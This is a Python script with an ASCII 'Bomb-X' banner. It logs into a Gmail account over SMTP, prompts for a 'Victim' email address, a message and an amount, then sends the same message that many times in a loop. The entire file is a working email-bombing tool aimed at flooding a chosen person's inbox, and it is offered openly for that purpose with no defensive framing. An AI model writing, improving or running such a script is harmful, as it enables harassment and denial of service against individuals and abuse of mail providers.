
r="\033[1;31m"         # Red
g="\033[1;32m"       # Green
ye="\033[1;33m"      # Yellow
b="\033[1;34m"        # Blue
p="\033[1;35m"      # Purple
cy="\033[1;36m"        # Cyan
w="\033[1;37m"       # White
logo=ye+str("""
______                    _                   
| ___ \                  | |                  
| |_/ /  ___   _ __ ___  | |__   ______ __  __
| ___ \ / _ \ | '_ ` _ \ | '_ \ |______|\ \/ /
| |_/ /| (_) || | | | | || |_) |         >  < 
\____/  \___/ |_| |_| |_||_.__/         /_/\_\ 
===============================================
     ***Devoloper : Mishkat Zaman***
===============================================
""")
print(logo)
import smtplib
rocx=smtplib.SMTP('smtp.gmail.com','587')
rocx.ehlo()
rocx.starttls()
email=str(input(g+"Enter Your Email : "+r))
pwd=str(input(b+"Enter Your Password : "+cy))
rocx.login(email,pwd)
tmail=str(input(ye+"Enter The Mail Address of Victim : "+w))
msg=str(input(g+"Enter The Message : "+r))
amount=int(input(ye+"Enter The Amount : "+w))
for i in range(amount):
	rocx.sendmail(email,tmail,msg)
	print(str(i+1)+r+" mail sent")